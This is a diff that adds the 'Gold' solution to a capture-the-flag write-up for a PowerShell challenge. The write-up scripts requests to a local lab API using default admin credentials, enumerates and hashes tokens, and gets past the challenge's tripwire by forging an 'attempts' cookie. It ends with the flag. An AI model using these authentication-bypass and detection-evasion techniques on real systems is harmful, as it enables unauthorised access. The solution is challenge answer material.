@@ -380,3 +380,134 @@ Correct Token supplied, you are granted access to the snow cannon terminal. Here
 ```
 
 ## Solution: Gold
+
+After completing the Silver PowerShell Objective, we reconnect with Piney Sappington, who suggests bypassing the usual path and writing our own PowerShell script to complete the challenge. Piney provides two crucial hints to help us succeed. The first relates to the hash value: although the token values in the token_overview.csv file have been REDACTED, we can still calculate their hashes by running the values through PowerShell’s Get-FileHash cmdlet with the SHA256 algorithm. The second hint pertains to the server’s EDR system, which monitors the number of responses. The EDR mechanism lazily blocks the first few attempts, but then allows all subsequent attempts. By leveraging these hints, we can bypass the EDR and use the correct hash to successfully complete the challenge.
+
+To tackle this challenge, I decided to write a PowerShell script that automates the process of validating tokens against the API. The script performs most of the steps from the Silver solution, iterating through each value from the token_overview.csv file. For each value, the script calculates the hash and attempts to validate it against the API, bypassing the manual process and saving time while ensuring accuracy. This approach leverages automation to efficiently complete the task and aligns with the hints about hash values and the EDR system’s behavior.
+
+```PowerShell
+### Set username & password
+$username = "admin"
+$password = "admin"
+
+#### Create a credential object
+$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
+
+### Downlaod CSV
+$request = Invoke-WebRequest http://localhost:1225/token_overview.csv -Credential $credential -AllowUnencryptedAuthentication
+
+### Export CSV
+$request.Content > token_overview.csv
+
+### Iterate over values and perform the requests
+$csvData = Import-Csv -Path "token_overview.csv"
+foreach ($row in $csvData) {
+    # Access the values in each row and compute the hash
+    $token = $row.file_MD5hash
+    $tempFile = New-TemporaryFile 
+    $token | Out-File -FilePath $tempFile.FullName -Encoding ASCII
+    $hash = (Get-FileHash -Path $tempFile.FullName -Algorithm SHA256).Hash.Trim()
+    Remove-Item -Path $tempFile.FullName -Force
+
+    # Make MFA request
+    $mfa = (Invoke-WebRequest http://localhost:1225/tokens/$hash -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=$($token)"})
+    $mfa.Content
+}
+```
+
+When running our PowerShell script, we encounter multiple messages indicating `Possible unauthorized access detected`. These messages are a result of the server’s monitoring system, which has a `threshold set to 10`. This is part of the Basic token evasion tactic, where the server detects multiple failed attempts and begins flagging them. The threshold indicates the point at which the server considers the number of access attempts to be suspicious.
+
+```HTML
+<h1>Canary TRIPWIRE</h1>
+<p>Possible unauthorized access detected.<br>Endpoints have been scrambled.<br>Basic token evasion tactics implemented, fakeout threshold set to 10.<br>Default token validity set to 2 seconds.</p><h1>Your current token is valid at <a href='1735899686.783599'>/mfa_validate/BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60</a></h1>
+<h1>Cookie 'mfa_code', use it at <a href='1735899686.7883127'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
+```
+
+I made a small change to my script to check which data is being stored in the headers.
+
+```PowerShell
+### Set username & password
+$username = "admin"
+$password = "admin"
+
+#### Create a credential object
+$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
+
+### Downlaod CSV
+$request = Invoke-WebRequest http://localhost:1225/token_overview.csv -Credential $credential -AllowUnencryptedAuthentication
+
+### Export CSV
+$request.Content > token_overview.csv
+
+### Iterate over values and perform the requests
+$csvData = Import-Csv -Path "token_overview.csv"
+foreach ($row in $csvData) {
+    # Access the values in each row and compute the hash
+    $token = $row.file_MD5hash
+    $tempFile = New-TemporaryFile 
+    $token | Out-File -FilePath $tempFile.FullName -Encoding ASCII
+    $hash = (Get-FileHash -Path $tempFile.FullName -Algorithm SHA256).Hash.Trim()
+    Remove-Item -Path $tempFile.FullName -Force
+
+
+    # Make MFA request
+    $mfa = (Invoke-WebRequest http://localhost:1225/tokens/$hash -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=$($token)"}).Links.href
+
+    $request = Invoke-WebRequest http://localhost:1225/mfa_validate/$hash -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=$($token); mfa_token=$($mfa)"}
+    $request.Headers
+}
+```
+
+To my surprise, I discovered a cookie named `attempts` with the value `c25ha2VvaWwK01`.
+
+```
+Server         {Werkzeug/3.0.6, Python/3.10.12}
+Date           {Fri, 03 Jan 2025 10:38:24 GMT}
+Set-Cookie     {attempts=c25ha2VvaWwK01; Path=/}
+Connection     {close}
+Content-Type   {text/html; charset=utf-8}
+Content-Length {36}
+```
+
+I attempt to decode the value in the cookie using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=YzI1aGEyVnZhV3dLMDE), and it turns out to be base64 encoded. The decoded value is `snakeoil`, which doesn’t seem to make much sense.
+
+Next, I modify our PowerShell script once more and decide to test with a cookie value of `11` to see what happens.
+
+```PowerShell
+### Set username & password
+$username = "admin"
+$password = "admin"
+
+#### Create a credential object
+$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
+
+### Downlaod CSV
+$request = Invoke-WebRequest http://localhost:1225/token_overview.csv -Credential $credential -AllowUnencryptedAuthentication
+
+### Export CSV
+$request.Content > token_overview.csv
+
+### Iterate over values and perform the requests
+$csvData = Import-Csv -Path "token_overview.csv"
+foreach ($row in $csvData) {
+    # Access the values in each row and compute the hash
+    $token = $row.file_MD5hash
+    $tempFile = New-TemporaryFile 
+    $token | Out-File -FilePath $tempFile.FullName -Encoding ASCII
+    $hash = (Get-FileHash -Path $tempFile.FullName -Algorithm SHA256).Hash.Trim()
+    Remove-Item -Path $tempFile.FullName -Force
+
+
+    # Make MFA request
+    $mfa = (Invoke-WebRequest http://localhost:1225/tokens/$hash -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=$($token)"}).Links.href
+
+    $request = Invoke-WebRequest http://localhost:1225/mfa_validate/$hash -Credential $credential -AllowUnencryptedAuthentication -Headers @{'Cookie'="token=$($token); mfa_token=$($mfa); attempts=11"}
+    $request.Content
+}
+```
+
+It worked! And I can see the following in one of the responses:
+
+```HTML
+<h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
+```
